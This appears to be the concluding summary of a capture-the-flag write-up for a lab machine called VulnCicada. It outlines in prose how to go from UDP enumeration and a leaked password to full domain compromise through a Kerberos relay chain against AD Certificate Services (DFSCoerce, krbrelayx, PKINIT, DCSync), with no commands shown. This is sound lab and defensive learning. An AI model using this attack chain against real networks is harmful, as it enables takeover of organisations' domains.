VulnCicada is an excellent box that reinforces a lesson every pentester needs to internalize: **enumerate everything, and then enumerate some more**. The initial phase is deliberately frustrating — SMB, RPC, and LDAP all have NULL and guest logins disabled, the web server is a bare IIS default page with no hidden directories, and Kerbrute against common wordlists yields nothing actionable. The breakthrough only comes from running a UDP scan, something many people skip entirely, which reveals an NFS share containing domain usernames. From there, a bit of OSINT trolling (a password literally on a sticky note in a PNG) gets us domain credentials.

The privilege escalation is where the box truly shines. The ADCS ESC8 vulnerability is a well-known attack path, but the complete disabling of NTLM authentication forces you to think beyond the standard playbook. You can't just fire up ntlmrelayx and call it a day — you need to understand how Kerberos relay works at a fundamental level, leverage the CredMarshalTargetInfo SPN trick to decouple DNS resolution from SPN construction, and chain DFSCoerce → krbrelayx → ADCS → PKINIT → DCSync for full domain compromise. This box is a fantastic demonstration of how "just disable NTLM" is not a silver bullet for relay attacks, and why defenders need to think holistically about authentication security.

PWNED!